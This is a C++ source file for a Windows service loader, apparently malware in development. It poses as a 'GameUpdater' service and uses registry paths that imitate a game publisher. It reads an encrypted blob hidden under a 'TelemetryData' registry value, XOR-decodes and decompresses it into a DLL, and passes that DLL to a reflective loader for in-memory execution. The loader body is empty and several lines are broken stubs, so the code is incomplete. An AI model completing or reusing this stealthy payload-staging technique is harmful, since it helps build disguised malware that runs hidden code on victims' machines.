//
// Created by mikul on 04.01.2026.
//

#include "Darkest_load.h"
#include "windows.h"
API_TABLE api;

unsigned char *decompress(BYTE * buffer, unsigned long size, unsigned long originalSize) {
    unsigned char *decompressed = (unsigned char *) malloc(originalSize);
    unsigned long finalSize = 0;

    NTSTATUS decompressStatus = api.RtlDecompressBuffer(
        0x0002, decompressed, originalSize, buffer, size, &finalSize);
    if (decompressStatus != 0 || finalSize != originalSize) {
        free(decompressed);
        return nullptr;
    }

    for (unsigned long i = 0; i < finalSize; i++) {
        decompressed[i] ^= 0x3D;
    }

    return decompressed;
}

SERVICE_STATUS SiteStatus = {0};
HANDLE hStatus = NULL;

void WINAPI ServiceHandler(DWORD opt) {
    switch (opt) {
        case 0x00000001: //stopped?
            SiteStatus.dwCurrentState = 0x00000001; // stopped!
            SetServiceStatus(hStatus, &SiteStatus);
            break;
    }
}

void ReflectiveLoader(BYTE *decompressed) {

}

void ExecutePayloadFromRegistry() {

    HANDLE registryKey = nullptr;
    QueryRegistryKey(&registryKey, L"\\Registry\\Machine\\SOFTWARE\\RedHook\\Darkest Dungeon II", L"", &api);



    HANDLE hKey;
    DWORD dwType = 3;
    DWORD dwSize = 0;

    if (OpenRegistryKey(L"SOFTWARE\\PublisherName\\Common", &api) == 0) {
        // 2. Get the size of the 90KB encrypted blob
        (hKey, L"TelemetryData", NULL, &dwType, NULL, &dwSize);
        BYTE *encryptedBlob = (BYTE *) malloc(dwSize);

        if (api.NtQueryValueKey(hKey, L"TelemetryData", NULL, &dwType, encryptedBlob, &dwSize) == 0) {
            for (DWORD i = 0; i < dwSize; i++) encryptedBlob[i] ^= 0x3D;
            BYTE *decompressedDLL = decompress(encryptedBlob, dwSize, 90158);
            ULONG finalSize = 0;
            ReflectiveLoader(decompressedDLL);
            free(decompressedDLL);
        }
        free(encryptedBlob);
        (hKey);
    }
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {

    hStatus = RegisterServiceCtrlHandlerW(L"GameUpdater", ServiceHandler);
    SiteStatus.dwServiceType = 0x00000020; //win32 share process
    SiteStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &SiteStatus);

    // Run the payload extraction
    ExecutePayloadFromRegistry();
}





